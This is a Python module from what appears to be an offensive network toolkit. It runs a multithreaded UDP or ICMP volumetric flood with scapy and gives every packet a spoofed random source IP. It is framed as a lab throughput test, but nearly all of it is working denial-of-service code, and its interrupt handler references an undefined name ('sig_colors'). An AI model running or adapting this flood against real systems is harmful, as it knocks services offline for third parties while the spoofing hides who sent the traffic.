# modules/dos/udp_icmp_flood.py
# Lynkeus Initiative — UDP & ICMP Volumetric Test
# Sends a high volume of stateless packets to evaluate network throughput
# Lab use only — run against machines you own

import random
import time
import threading

try:
    from scapy.all import IP, UDP, ICMP, send, conf
    conf.verb = 0
except ImportError:
    print("[!] scapy is not installed. Run: pip install scapy")
    exit(1)

from output.colors import GREEN, RED, YELLOW, CYAN, DIM, BOLD, RESET

packet_count = 0
running = True
lock = threading.Lock()

def flood_worker(target_ip, target_port, protocol, size):
    # Worker thread that continuously generates and sends stateless packets
    global packet_count, running

    # Generate a dummy static payload matching the specified size
    # Standard Ethernet MTU is 1500 bytes, so payload size is typically kept realistic
    payload = b"X" * size

    while running:
        try:
            # Spoof source IP to simulate distributed lab traffic
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            
            # Construct the base Network Layer (IP) header
            ip_layer = IP(src=src_ip, dst=target_ip)

            # Construct the Transport/Control Layer header based on configuration
            if protocol.upper() == "UDP":
                src_port = random.randint(1024, 65535)
                packet = ip_layer / UDP(sport=src_port, dport=target_port) / payload
            elif protocol.upper() == "ICMP":
                # Type 8 is standard ICMP Echo Request (Ping)
                packet = ip_layer / ICMP(type=8, code=0) / payload
            else:
                return

            send(packet, verbose=0)

            with lock:
                packet_count += 1
        except Exception:
            pass

def run_volumetric_flood(target_ip, target_port, protocol, duration, threads, size=64):
    # Manages the lifecycle of the volumetric network test
    global packet_count, running

    packet_count = 0
    running = True

    print("")
    print(CYAN + "=" * 55 + RESET)
    print(BOLD + f"  {protocol.upper()} FLOOD TEST" + RESET)
    print(CYAN + "=" * 55 + RESET)
    print("  Target   : " + BOLD + f"{target_ip}" + (f":{target_port}" if protocol.upper() == "UDP" else "") + RESET)
    print(f"  Protocol : {protocol.upper()}")
    print(f"  Size     : {size} bytes payload")
    print(f"  Duration : {duration} seconds")
    print(f"  Threads  : {threads}")
    print(RED + "  WARNING  : Lab use only. Ensure network isolated." + RESET)
    print(CYAN + "-" * 55 + RESET)
    print("")
    print(YELLOW + "  [*] Test starting..." + RESET)
    print("")

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=flood_worker, args=(target_ip, target_port, protocol, size))
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        start = time.time()
        while time.time() - start < duration:
            time.sleep(1)
            elapsed = int(time.time() - start)
            with lock:
                current = packet_count
            print("  [" + str(elapsed) + "s]  Packets transmitted: " + GREEN + str(current) + RESET)
    except KeyboardInterrupt:
        print("\n" + sig_colors.YELLOW + "  [!] Test interrupted by operator." + RESET)

    running = False
    for t in workers:
        t.join(timeout=1)

    print("")
    print(CYAN + "-" * 55 + RESET)
    print("  " + BOLD + "Test complete." + RESET)
    print("  Total packets sent : " + GREEN + str(packet_count) + RESET)
    print(CYAN + "=" * 55 + RESET)
